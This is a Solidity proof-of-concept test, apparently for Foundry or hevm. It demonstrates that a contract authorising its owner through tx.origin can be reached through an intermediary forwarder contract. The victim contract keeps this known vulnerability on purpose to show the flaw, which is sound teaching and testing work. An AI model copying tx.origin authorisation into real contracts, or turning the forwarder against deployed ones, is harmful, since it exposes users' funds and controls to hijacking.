// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

interface Vm {
    function prank(address sender) external;
}

contract TxOriginVictim {
    address public owner;

    constructor() {
        owner = tx.origin;
    }

    function privilegedAction() external view returns (bool) {
        require(tx.origin == owner, "not owner");
        return true;
    }
}

contract TxOriginForwarder {
    function forward(address victim) external returns (bool) {
        (bool success, bytes memory data) = victim.call(
            abi.encodeWithSignature("privilegedAction()")
        );
        require(success, "forward failed");
        return abi.decode(data, (bool));
    }
}

contract TxOriginPoC {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function testPoC_ForwarderPassesTxOriginAuth() external {
        address owner = address(0xCAFE);
        vm.prank(owner);
        TxOriginVictim victim = new TxOriginVictim();
        TxOriginForwarder forwarder = new TxOriginForwarder();
        vm.prank(owner);
        bool succeeded = forwarder.forward(address(victim));
        require(succeeded, "tx.origin auth was not reached through forwarder");
    }
}
